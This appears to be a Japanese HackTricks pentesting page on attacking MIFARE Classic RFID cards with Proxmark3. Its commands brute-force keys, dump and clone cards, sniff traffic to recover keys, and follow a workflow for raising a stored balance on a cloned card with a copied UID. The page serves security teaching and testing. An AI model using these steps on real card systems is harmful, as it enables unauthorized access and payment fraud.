# Proxmark 3

{{#include ../../banners/hacktricks-training.md}}

## Proxmark3を使ったRFIDシステムへの攻撃

メンテナンスが継続されているRRG/Iceman Proxmark3 clientと対応するfirmwareをインストールし、以下に示す古いコマンドは変更されている場合があるため、そのビルドでコマンドの構文を確認してください。<sup>[[1]](#references)[[5]](#references)</sup>

### MIFARE Classic 1KBへの攻撃

MIFARE Classic 1Kには**16個のセクター**があり、各セクターは**16バイトのブロック**を**4個**含みます。Manufacturer block 0にはUID/manufacturer dataが含まれ、本物のNXPカードでは読み取り専用です。特別なクローンカードや「magic」カードでは、書き換えが可能な場合があります。<sup>[[1]](#references)[[2]](#references)</sup>\
各セクターにアクセスするには、**2つのキー**（**A**と**B**）が必要です。これらのキーは、各セクターの**block 3**（sector trailer）に格納されています。sector trailerには、2つのキーを使って**各ブロックの読み取りと書き込み**の権限を設定する**access bits**も格納されています。\
たとえば、1つ目のキーが分かれば読み取りを、2つ目のキーが分かれば書き込みを許可する、といった権限設定に2つのキーを利用できます。

いくつかの攻撃を実行できます。

```bash
proxmark3> hf mf #List attacks

proxmark3> hf mf chk *1 ? t ./client/default_keys.dic #Keys bruteforce
proxmark3> hf mf fchk 1 t # Improved keys BF

proxmark3> hf mf rdbl 0 A FFFFFFFFFFFF # Read block 0 with the key
proxmark3> hf mf rdsc 0 A FFFFFFFFFFFF # Read sector 0 with the key

proxmark3> hf mf dump 1 # Dump the information of the card (using creds inside dumpkeys.bin)
proxmark3> hf mf restore # Copy data to a new card
proxmark3> hf mf eload hf-mf-B46F6F79-data # Simulate card using dump
proxmark3> hf mf sim *1 u 8c61b5b4 # Simulate card using memory

proxmark3> hf mf eset 01 000102030405060708090a0b0c0d0e0f # Write those bytes to block 1
proxmark3> hf mf eget 01 # Read block 1
proxmark3> hf mf wrbl 01 B FFFFFFFFFFFF 000102030405060708090a0b0c0d0e0f # Write to the card
```

Proxmark3では、機密データを見つけるために、**Tag to Reader communication** の **eavesdropping** などの操作も実行できます。このカードでは、使用されている**暗号処理が弱く**、平文と暗号文が分かれば使用された key を計算できるため（`mfkey64` tool）、通信を sniff するだけで済みます。<sup>[[3]](#references)</sup>

#### MiFare Classic の stored-value 不正利用における簡易ワークフロー

端末が Classic カードに残高を保存する場合、一般的なエンドツーエンドのフローは次のとおりです。<sup>[[4]](#references)</sup>

```bash
# 1) Recover sector keys and dump full card
proxmark3> hf mf autopwn

# 2) Modify dump offline (adjust balance + integrity bytes)
#    Use diffing of before/after top-up dumps to locate fields

# 3) Write modified dump to a UID-changeable ("Chinese magic") tag
proxmark3> hf mf cload -f modified.bin

# 4) Clone original UID so readers recognize the card
proxmark3> hf mf csetuid -u <original_uid>
```

メモ

- `hf mf autopwn` は nested/darkside/HardNested-style attacks を実行し、キーを復元して、client dumps folder にダンプを作成します。<sup>[[1]](#references)</sup>
- block 0/UID の書き込みは magic gen1a/gen2 cards でのみ可能です。通常の Classic cards では UID は読み取り専用です。<sup>[[2]](#references)</sup>
- 多くの環境では Classic の「value blocks」や単純なチェックサムが使われています。編集後は、複製・反転されたフィールドとチェックサムがすべて整合していることを確認してください。<sup>[[4]](#references)</sup>

より上位の方法論と緩和策については、以下を参照してください。

{{#ref}}
pentesting-rfid.md
{{#endref}}

### Raw Commands

IoT システムでは、**ブランド名のないタグや市販品ではないタグ**が使われることがあります。この場合、Proxmark3 を使用して**タグにカスタム raw commands を送信**できます。

```bash
proxmark3> hf search UID : 80 55 4b 6c ATQA : 00 04
SAK : 08 [2]
TYPE : NXP MIFARE CLASSIC 1k | Plus 2k SL1
  proprietary non iso14443-4 card found, RATS not supported
  No chinese magic backdoor command detected
  Prng detection: WEAK
  Valid ISO14443A Tag Found - Quitting Search
```

この情報を使って、カードやカードとの通信方法について情報を検索できます。Proxmark3では、次のような raw コマンドを送信できます: `hf 14a raw -p -b 7 26`

### スクリプト

Proxmark3 softwareには、簡単なタスクを実行するための**automation scripts**があらかじめ用意されています。すべてのスクリプトを一覧表示するには、`script list`コマンドを使用します。次に、`script run`コマンドに続けてスクリプト名を指定します:

```
proxmark3> script run mfkeys
```

tag readerを**fuzz**するscriptを作成できます。**有効なカード**のデータをコピーし、1つ以上のランダムな**byte**をランダム化する**Lua script**を書いて、各イテレーションで**readerがクラッシュするか**確認するだけです。

## References

- [1] [Proxmark3 wiki: HF MIFARE](https://github.com/RfidResearchGroup/proxmark3/wiki/HF-Mifare)
- [2] [Proxmark3 wiki: HF Magic cards](https://github.com/RfidResearchGroup/proxmark3/wiki/HF-Magic-cards)
- [3] [MIFARE Classic Crypto1に関するNXPの声明](https://www.mifare.net/en/products/chip-card-ics/mifare-classic/security-statement-on-crypto1-implementations/)
- [4] [KioSoft Stored ValueにおけるNFCカード脆弱性の悪用（SEC Consult）](https://sec-consult.com/vulnerability-lab/advisory/nfc-card-vulnerability-exploitation-leading-to-free-top-up-kiosoft-payment-solution/)
- [5] [RRG/Iceman Proxmark3 — Linuxへのインストール](https://github.com/RfidResearchGroup/proxmark3/blob/master/doc/md/Installation_Instructions/Linux-Installation-Instructions.md)
{{#include ../../banners/hacktricks-training.md}}
